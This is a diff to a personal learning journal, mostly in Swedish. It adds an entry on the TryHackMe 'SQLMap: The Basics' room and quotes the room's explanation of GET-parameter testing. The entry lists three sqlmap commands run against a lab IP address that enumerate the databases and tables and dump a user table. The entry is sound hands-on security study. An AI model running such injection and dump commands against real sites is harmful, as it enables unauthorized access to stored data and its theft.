@@ -1,3 +1,17 @@
+# 2025-11-29
+## SQLMap: The Basics
+Saxar följande information rakt från TryHackMe då det var intressant: <br>
+The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the -u flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.<br>
+
+Följande behövdes för att lösa uppgiften på slutet: <br> 
+
+<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' --dbs</code> <br>
+<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' -D ai --tables</code> <br>
+<code>sqlmap -u 'http://10.82.141.105/AI/includes/user_login?email=test&password=test' -D ai -T user --dump</code> <br>
+
+Och med det så blev rummet avklarat. <br>
+![SQLmap basics](<bilder/Skärmbild 2025-11-29 sqlmap basics.png>)
+
 # 2025-11-28
 De har ändrat om i ordningen i Cyber101, så OWASP har fått ett nytt rum för 2025 och det rummet är placerat i slutet av Cyber101 om jag förstått det rätt. Vilket passar mig bra. Nu börjar det vara dags att göra om Burp Suite!
 
